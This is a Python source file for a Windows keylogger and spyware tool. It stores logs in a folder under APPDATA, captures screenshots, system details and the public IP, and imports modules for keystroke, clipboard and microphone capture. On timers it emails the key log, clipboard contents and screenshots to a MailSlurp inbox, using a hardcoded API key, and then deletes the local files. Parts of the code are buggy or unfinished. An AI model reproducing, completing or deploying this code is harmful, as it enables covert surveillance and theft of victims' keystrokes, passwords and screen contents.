from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from threading import Timer
import time
from resettabletimer import ResettableTimer
from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP
from threading import Timer
import time
from email.message import EmailMessage

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


keys_information = "key_log.txt"
system_information= "systeminfo.txt"
screenshot_information= "screenshot.png"
clipboard_information = "clipboard.txt"

file_path = os.getenv('APPDATA')
try:
    os.mkdir(file_path + '\\keylogger')
except:
    pass

extend="\\keylogger\\"

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPaddr + "\n")
        
computer_information()

configuration = mailslurp_client.Configuration()
configuration.api_key['x-api-key'] = "40a688f9057922a582256f5b0ac396ebf21f194681ac2b9a0c6dbc521be79dbe" #change api
with mailslurp_client.ApiClient(configuration) as api_client:
    # create an inbox
    inbox_controller = mailslurp_client.InboxControllerApi(api_client)
    options = mailslurp_client.CreateInboxDto()
    options.name = "data"
    options.inbox_type="SMTP_INBOX"
    inbox = inbox_controller.create_inbox_with_options(options)
    #print("email address is " + inbox.email_address)
    
access_details=inbox_controller.get_imap_smtp_access(inbox_id=inbox.id)
c=0
def send_log():
    with open(file_path+ extend + keys_information, 'rb') as f1,open(file_path+ extend +system_information, 'rb') as f2,open(file_path+ extend + clipboard_information, 'rb') as f3:
        file1_data=f1.read() 
        file1_name=f1.name()
        if c<1:
            file2_data=f2.read() 
            file2_name=f2.name()
        file3_data=f3.read() 
        file3_name=f3.name()
    #print(access_details)
    #print("sending")
    with SMTP(
        host=access_details.smtp_server_host,
        port= access_details.smtp_server_port,
    ) as smtp:
        msg= EmailMessage()
        msg.add_attachment(file1_data, maintype='text', subtype='plain',filename=file1_name)
        if c<1:
            msg.add_attachment(file2_data, maintype='text', subtype='plain',filename=file2_name)
        msg.add_attachment(file3_data, maintype='text', subtype='plain',filename=file3_name)
        smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
        smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
        smtp.quit()
    #print("check your mail :)")
    c=c+1
    os.remove(file_path+ extend + keys_information)
    if c<1:
        os.remove(file_path+ extend +system_information)
    os.remove(file_path+ extend + clipboard_information) #deletes files

def send_img():
    screenshot()
    with open(file_path+ extend + screenshot_information, 'rb') as f4:
        file_data=f4.read() 
        file_name=f4.name
    
    #print(access_details)
    #print("sending")
    with SMTP(
        host=access_details.smtp_server_host,
        port= access_details.smtp_server_port,
    ) as smtp:
        msg= EmailMessage()
        msg.add_attachment(file_data, maintype='image', subtype='png',filename=file_name)
        smtp.login(user=access_details.smtp_username,password=access_details.smtp_password)
        smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
        smtp.quit()
    #print("check your mail :)")
    os.remove(file_path+ extend + screenshot_information) #deletes png file
    
tlog = ResettableTimer(7200.0, send_log) #7200sec, 2hr
timg= ResettableTimer(900,send_img) #900 seconds,ie 15 mins, can be changed 

tlog.start()
timg.start()
start_time=time.time()
while True:
    if time.time()-start_time==90:
        timg.reset()
        timg.start()
    if time.time()-start_time==720:
        tlog.reset()
        tlog.start()